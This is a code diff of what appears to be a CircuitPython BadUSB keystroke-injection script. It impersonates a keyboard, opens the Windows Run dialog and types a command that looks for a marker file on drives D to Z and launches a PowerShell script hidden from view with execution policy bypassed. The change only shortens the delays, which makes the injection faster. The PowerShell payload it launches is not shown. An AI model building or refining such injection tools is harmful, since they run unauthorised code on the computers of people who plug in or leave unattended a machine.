@@ -10,15 +10,13 @@ time.sleep(1.5)
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(kbd)
 
-def type_and_enter(text, delay=0.5):
+def type_and_enter(text):
     layout.write(text)
-    time.sleep(delay)
     kbd.send(Keycode.ENTER)
-    time.sleep(0.6)
 
 # เปิด Run
 kbd.send(Keycode.GUI, Keycode.R)
-time.sleep(1.2)
+time.sleep(0.4)
 
 cmd = 'cmd /c for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %d:\.filename start powershell -w h -ep bypass -f "%d:\\filename.ps1"'
 
